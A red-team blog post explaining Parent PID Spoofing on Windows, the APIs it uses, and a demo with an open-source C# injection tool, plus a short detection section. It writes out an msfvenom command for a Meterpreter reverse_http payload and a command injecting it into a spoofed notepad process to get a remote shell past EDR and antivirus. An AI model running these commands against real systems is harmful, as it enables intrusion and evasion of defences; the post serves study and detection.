# https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40r3n_hat%2Fparent-pid-spoofing-b0b17317168e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40r3n_hat%2Fparent-pid-spoofing-b0b17317168e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Parent PID Spoofing

[![Renos Nikolaou](https://miro.medium.com/v2/resize:fill:32:32/2*mNW7c7ROKU_o1UgZ20AzvA.jpeg)](https://medium.com/@r3n_hat?source=post_page---byline--b0b17317168e---------------------------------------)

[Renos Nikolaou](https://medium.com/@r3n_hat?source=post_page---byline--b0b17317168e---------------------------------------)

4 min read

·

Nov 2, 2019

--

Listen

Share

While I was conducting my research on process injection techniques, I came across [Chirag’s](https://twitter.com/chiragsavla94) blog where he wrote a [tool](https://github.com/3xpl01tc0d3r/ProcessInjection) with two process injection techniques, Vanila Injection and DLL Injection using C#.

I decided to contribute to his [project](https://github.com/3xpl01tc0d3r/ProcessInjection) by adding [**process hollowing**](https://attack.mitre.org/techniques/T1093/) technique and an evasion technique called **Parent PID Spoofing** for two main reasons:

1. To improve my C# skills, leveraging Windows APIs.
2. To do an in depth process injection research.

This post should be considered as the Part IV of Chirag’s [Process Injection](https://3xpl01tc0d3r.blogspot.com/search/label/Process%20Injection) series. So, I will follow the same writing structure.

### What is Parent Process Identifier (PID) Spoofing ?

Starting from Windows Vista, [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) Windows API function and specifically the parameter **lpStartupInfo** can be used to start (spoof) an application (child process) where an adversary can specify the parent process. (e.g. As shown below, parent process: iexplore.exe with PID: 3224 spawned notepad.exe as a child process with PID: 6968).

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*-oYTsPYr65reYU1h1im2OA.png)

For the purpose of Parent PID Spoofing evasion technique 5 Windows APIs are used:

- [InitializeProcThreadAttributeList](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) \- Initialize the attribute list and allocate space required for the attribute.
- [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)\- Get the parent process handle.
- [DuplicateHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle)\- Duplicate target process.
- [UpdateProcThreadAttribute](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)\- Set the parent process handle.
- [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)\- Creates a new process and its primary thread. The new process runs in the security context of the calling process.

### Overview of Parent PID Spoofing

Parent PID Spoofing is an evasion technique used by malware and attackers that can utilize the CreateProcess Microsoft API and execute arbitrary code by injecting a [shellcode](https://en.wikipedia.org/wiki/Shellcode), [Dynamic-Link Library](https://en.wikipedia.org/wiki/Dynamic-link_library) (DLL) or [Portable Executable](https://en.wikipedia.org/wiki/Portable_Executable) (PE) into the child process and thus evade some defenses like EDR and Anti-Virus.

Find below the steps that I followed while adding the Parent PID Spoofing evasion technique:

1. The first API call [InitializeProcThreadAttributeList](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) initialized the attribute list and allocated the memory space required for the attribute.
2. Used [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to Obtain the handle of the target process.
3. [UpdateProcThreadAttribute](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) is called and set the parent process handle to PROC\_THREAD\_ATTRIBUTE\_PARENT\_PROCESS attribute.
4. Last step was to call [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) in order to pass a new flag in dwCreationFlags parameter called EXTENDED\_STARTUPINFO\_PRESENT that enables the caller to pass a STARTUPINFOEX structure pointer.

### Demo

Currently the Parent PID Spoofing supports 3 process injection techniques (Vanila process injection, DLL injection and Process Hollowing) and for the purpose of the demonstration I will use the vanila process injection with shellcode in C format.

The tool can be found on [github repo](https://github.com/3xpl01tc0d3r/ProcessInjection).

## Get Renos Nikolaou’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

**Required parameters:**

- /ppath : This parameter is used to specify the process path which will be the child process.
- /path: MSFVenom shellcode.
- /parentproc: The parent process binary name.
- /f: The format of the shellcode that was generated.
- /t: The target evasion technique that you want to use.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Dm1NyHel7qXi4Pr2_j8-7w.png)

Generate a reverse http shellcode using MSFVenom. (Feel free to use any tool you want. Cobalt Strike, Donut, etc..etc..)

```
msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=10.10.10.10 LPORT=80 -b "\x00" -f c
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*UcpB1tl1_S51SdVSQ0BbiA.png)

```
ProcessInjection.exe /ppath:"c:\windows\system32\notepad.exe" /path:"c:\users\user\desktop\shcode.txt" /parentproc:explorer /f:c /t:5
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*IvQeYyz7O0mtELMUInLQ1Q.png)

The screenshot shows that the tool found the parent process ID (explorer.exe- 4148), spawned notepad.exe (PID: 9692) as a child process and then injected the MSFVenom reverse http shellcode into the child process.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*vUeZsXPbWpePZmiOtuwuAg.png)

Got meterpreter reverse http shell with PID: 9692.

### Detection

Monitor Windows API calls that are created with extended startup information and calls, that are being used to update process creation attributes such as CreateProcess and UpdateProcThreadAttribute accordingly. Also, monitor processes especially under (c:\\Windows\\System32\\\* or c:\\Windows\\SysWOW64\\\*) for abnormal behavior such as opening network connections.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*AEBJaWarJqqCBKjs9uVIIg.png)

As shown above, notepad.exe communicating with my Command and Control. (Metasploit Framework).

Thanks for reading the post. Feedback is always welcome.

Also, thanks to my friends [George Koumettou](https://twitter.com/gkoume01) , Andrianos Sergides and Alexis Mansour who helped and motivated me to write this post.

### References

- [https://attack.mitre.org/techniques/T1502/](https://attack.mitre.org/techniques/T1502/)
- [https://blog.f-secure.com/detecting-parent-pid-spoofing/](https://blog.f-secure.com/detecting-parent-pid-spoofing/#Reference2)
- [https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3/](https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3/)
- [https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/](https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/)
- [http://winprogger.com/launching-a-non-child-process/](http://winprogger.com/launching-a-non-child-process/)
- [https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch](https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch)
- [https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/](https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/)

Follow me on twitter - [https://twitter.com/r3n\_hat](https://twitter.com/r3n_hat)

[Red Team](https://medium.com/tag/red-team?source=post_page-----b0b17317168e---------------------------------------)

[Process Injection](https://medium.com/tag/process-injection?source=post_page-----b0b17317168e---------------------------------------)

[Parent Pid Spoofing](https://medium.com/tag/parent-pid-spoofing?source=post_page-----b0b17317168e---------------------------------------)

[![Renos Nikolaou](https://miro.medium.com/v2/resize:fill:48:48/2*mNW7c7ROKU_o1UgZ20AzvA.jpeg)](https://medium.com/@r3n_hat?source=post_page---post_author_info--b0b17317168e---------------------------------------)

[![Renos Nikolaou](https://miro.medium.com/v2/resize:fill:64:64/2*mNW7c7ROKU_o1UgZ20AzvA.jpeg)](https://medium.com/@r3n_hat?source=post_page---post_author_info--b0b17317168e---------------------------------------)

[**Written by Renos Nikolaou**](https://medium.com/@r3n_hat?source=post_page---post_author_info--b0b17317168e---------------------------------------)

[94 followers](https://medium.com/@r3n_hat/followers?source=post_page---post_author_info--b0b17317168e---------------------------------------)

· [86 following](https://medium.com/@r3n_hat/following?source=post_page---post_author_info--b0b17317168e---------------------------------------)

Cyber Security Addicted. Developer: GRAT2, SharpWifiGrabber, XORedReflectiveDLL. OASP, OSCE, OSCP, OSWP, eCPTX, eWPTX, PACES, CARTP Certified. Twitter: @r3n\_hat

## No responses yet

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40r3n_hat%2Fparent-pid-spoofing-b0b17317168e&source=---post_responses--b0b17317168e---------------------respond_sidebar------------------)

Cancel

Respond

[Help](https://help.medium.com/hc/en-us?source=post_page-----b0b17317168e---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----b0b17317168e---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----b0b17317168e---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----b0b17317168e---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----b0b17317168e---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----b0b17317168e---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----b0b17317168e---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----b0b17317168e---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----b0b17317168e---------------------------------------)

reCAPTCHA